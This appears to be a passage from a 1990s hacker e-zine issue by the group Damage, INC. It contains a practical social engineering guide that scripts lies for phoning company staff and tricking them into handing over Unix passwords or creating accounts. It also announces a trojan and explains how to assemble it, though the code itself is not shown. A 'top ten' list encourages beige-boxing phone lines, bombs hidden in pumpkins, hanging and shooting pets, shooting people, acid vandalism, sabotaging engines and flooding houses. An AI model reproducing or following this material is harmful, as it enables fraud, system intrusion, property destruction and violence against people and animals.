I think if a hacker movie was to be done properly, it would far more like
Pulp Fiction/Clerks/Trainspotting.  Not much editing, actors that were more
hackers than actors, and a producer that wasn't bent on going mainstream
to make money.  Only then could our community be properly represented.

    I am a firm hater of "Hollywood style" movies.  They are all the same,
just with a slight twist in the plot, and some different actors.  For those
reading this that have never experienced the thrill of hacking an extender,
or coding a trojan, pay attention closely:  Hacking is nothing like you
think it is.  All, and I repeat *All* of you have a misconception that h/p
is about reading text files and then doing what they say.  This cannot be
further from the truth.  It is about racking your brains to think of a
potential security leak.  It is about brainstorming new ideas for social
engineering.  Hollywood is in some cases the cause of these misconceptions.
And there is always a message in my articles.  It is of vital importance
to constantly and completely evaluate all information entering your senses
throughout waking consciousness.  Decide whether the data matches and fits
in with your belief system.  Be aware of false data/propaganda, especially
from Big Brother, and seek out information that corresponds with your
interests.

chatter, let's get down to business.
    Throughout the history of networked computers, the biggest security
breach comes from humans.  You can't beat a computer, you really can't.
Ask Blade Runner, guessing passwords just doesn't work ;).  Perhaps every
now and then you find a unix terminal that hasn't got a certain bug removed,
in which case you promptly take advantage of the loophole, and give yourself
admin access.  But unfortunately it's not always that easy.  A certain amount
of tact must be applied if you wish to successfully break the system you've
been tracking for weeks.  Trashing is one of the alternatives, but that can
be saved for another time.  In this article I want to explain to you the
basics of social engineering, what it is, and perhaps answer some questions
you might find yourself asking.
    So what is social engineering?  Put simply, it is calling up a person
associated with your target system, and fooling them into giving you
information otherwise kept for special users.  There are many variations on
this, and I encourage you not to practice any of the ideas presented here,
but think of your own.  This will serve as a starting point for ideas you
create on your own.

    Let's say for example I have been scanning the exchange for carriers, and
I come across an unsupervised unix prompt.  The first thing to do is record
the phone number (this will be done automatically by a wardialer).   After
this I would try to find out what other numbers go with that one.  I would
call say 5 number variations on either side, let me show you.

            --> 651-1502 <-- number found by scanner
                651-1497 \
                651-1498  \
                651-1499   \
                651-1500    |
                651-1501     I dial these numbers off my voice phone, and  
                651-1503     find out who answers, etc.
                651-1504    |
                651-1505   /
                651-1506  /
                651-1507 /

    Okay, I have dialed all of the surrounding numbers, and got some busies,
no-answers, residence lines, and 3 business lines.  These are what you are
looking for, as it is quite possible they are connected to the 651-1502
which has the carrier on the end of it.  It depends now on your research
skills, as to how much you decide to find out about the companies.  This
is important because there's not much point in hacking a hardware store
for example.  The social engineering comes into play here, because you will
use this to find out what companies are on the other end of those voice
lines.  Either divert your call or use *67 to at least fool their
call-display.  I call the first number :

     Target: "Hello, Branton & Branton Co."
         TJ: "Hi, can you spare 5 minutes of your time, I'm doing
              a research paper for school."
     Target: "Ohh, what school, etc etc."
         TJ: "Guelph University, Macro-Economics & social darwinism"
              (or some bullshit)
     Target: "Okay, what do you need?"
         TJ: "Uhm, ..What type of service does your business provide?"
     Target: "Financial Assistance for retired politicians."
         TJ: "ahh, okay.  And what is the average annual profit for this
              company?"
     Target: "blah blah"
         TJ: "Okay, thank you very much for your time.  I appreciate your
              co-operation."  (be sure to be very polite, no matter what)

This is a sample conversation with a possible hack.  That is social
engineering right there.  It is the ability to lie quickly, and believably.
The skill comes with practice, and once you find a good outline, you can
use it for almost any target.
    Once you decide on a suitable system to hack, your focus is to get in
without drawing attention to yourself.  Call the business up again, and
this time be ready to adapt your story as you go along.  You are attempting
to trick this person into giving you a password, so obviously they will be
suspicious.  Whatever you do, don't give up.  It is an indicator you are
full of shit.  You must be assertive, and pretend you are doing your job -
Unix Maintenance Engineer for the Branton & Branton Co. Network.
(or whatever you choose.) I will provide a list of possible lies that might
work on a gullible victim (because remember, some people aren't stupid, and
will figure you out. Be ready)

            -Say you just started working for the company, but have not
             yet been given access to unix.  Ask the secretary to set up
             an account under the following name, with the following
             password. (now you have an account on there)

            -Say you have been attempting to connect to the server, but
             it does not seem to be connecting right.  Use lots of rich
             terminology to confuse the poor bitch, and at the same time
             make her think you know what you're doing.  This technique
             when modified is unbeatable.

            -One thing to be aware of is that you should never mention
             the word "password" in the first 3-5 minutes of conversation.
             Give the person the impression there is something wrong with
             their system, and then proceed to bullshit your way around
             them verbally until they decide to give you the sysop password
             or whatever your request may be.

            -You must establish yourself immediately, and don't falter.

            -One other thing I forgot to mention, for those of you who don't
             have a man's voice. (pre-pubescent) ;) you can get hold of a
             voice changer, from about $29.99, or use a wave editor that
             takes mic input and changes the pitch to a lower one.

Conclusion:
    This information has been provided in the hopes that people will once
again seek out new ways to gain access, and also learn more about a
suspicious company, or whatever.  These are strictly guidelines and should
not be followed to the letter.  To anybody who successfully uses these
techniques, please let me know, I'd love to hear about it.

SOURCE AND SCRIPTS -                                               {SOURCE}
The RAZORBACK trojan by Damage, INC.

This is the long awaited, RAZORBACK trojan.  It wasn't intended to be used
for malicious purposes.  However, if it is used for destructive purposes then
we aren't responsible for any damage it causes.  We're releasing it, but are
not condoning that type of usage.  Also, we aren't hiding it in anything or
executing it on anyone else's system.  It's up to you to use DEBUG to assemble
it.  After that, you are supposed to use it for informational, educational
purposes to learn more about trojans.  That's the disclaimer.  That is also the
only warning we are going to issue to anyone reading this.  ;)
Shown below is some information about memory requirements, file size and how to
use DEBUG.

Conventional Memory :

  Name                Size in Decimal       Size in Hex
-------------      ---------------------   -------------
  RAZOR               2384      (  2.3K)        950


Clip out the RAZORBACK debug script and save it to a file called RAZOR.SCR.
Then use DEBUG < RAZOR.SCR at a DOS prompt to assemble it.  The result will
be RAZOR.COM, which should be 1117 bytes.

The Journalist's Top Ten List -                                   {TOP TEN}
  "Phun things to do in the Fall..."

    1.  An oldie but a goody.  Beige Box some unsuspecting idiot's
        house.  A bonus is if you have a laptop ;)
    2.  Pour HCl around the trees and bushes in your neighbourhood. -
        ruin it for those who like the fall colours.
    3.  Pile the leaves from the curb into the middle of the road.
        This works even better if you put half bricks, half leaves, haha.
    4.  A little early, but smashing pumpkins on the walls of people's
        houses always relieves stress! ;)
    5.  An alternative is to put a small bomb inside it, and use a
        remote detonator.  Make sure you ring the doorbell before you run!
    6.  Halloween & Devil's night always provide a plethora of pranks
        for the amateur terrorist.  Make sure you get into the spirit of
        Halloween, and hang your neighbours cats/dogs from the tree.
        Perhaps the tree outside the local church.
    7.  Tell all your (lamer) friends that Daylight Savings Time has
        been cancelled this year due to budget cutbacks.
    8.  Lots of people take walks in the fall.  To see the "pretty colours"
        <g>.  This is the perfect opportunity to bring out the old pellet
        gun, and have some phun!  As a rule, only shoot the dogs they walk,
        but if the neighbourhood asshole walks by, 'pop a cap in his ass' ;)
    9.  Go to a snowmobile auction.  Pretend to be "looking" in the gas
        tank, but instead pour sugar into it.  Be sure you don't miss the
        expensive ones.
   10.  And the final way to cause anarchy in the fall...
        Sneak to the local asshole's house.  Block his drainpipe by stuffing
        a load of stones/dirt/concrete mixture into the top or bottom.  This
        will probably cause his house to flood in the spring, or even before
        winter *starts*! haha, there goes the Christmas bonus ;)

CLOSING COMMENTS -                                                {CLOSING}

We had planned to include a list of h/p sites, but we decided to release all
lists separately instead.  There are going to be many lists created by us and
released.  They are for the purpose of using to gain more information, and by
no means should you just rely on them as your only source.  As in, you have to
look for things on your own if you want to learn and become involved in the
h/p scene.  Overall, I feel that the local h/p scene is starting to change.
Damage, INC. is changing the way people look at h/p, their attitudes, and
ignorance by providing them with quality, reliable information.

Also, there are people bashing and attacking Damage, INC. in this area, yet
they don't even know what we're involved in.  Instead of making assumptions,
or listening to rumours, learn the truth and get the facts straight.  Just
because we include a debug script for a trojan in the newsletter, doesn't
mean we are responsible for it nuking someone or a board.  Why not?  Debug
scripts aren't executable files, nor are we uploading the trojan anywhere.
Therefore, it's up to you if/how the trojan is used.  Think about it.  ;)

We're still looking for Writers, Members and Distribution Sites.  If you'd like
to apply to Damage, INC. and join a respected h/p group, then download a copy of
the Damage, INC. Application Generator.  If you want any of our releases, they
are available on the following boards:

...AND JUSTICE FOR ALL - Damage, INC. WHQ, h/p/a/c/v/t, no ratios, invite only.
Freedom of Information Archives - Damage, INC. Dist. Site, h/p/a/c/v/t.

Any feedback or letters to the editor should be sent to BLACKENED in Email on
a Damage, INC. board.
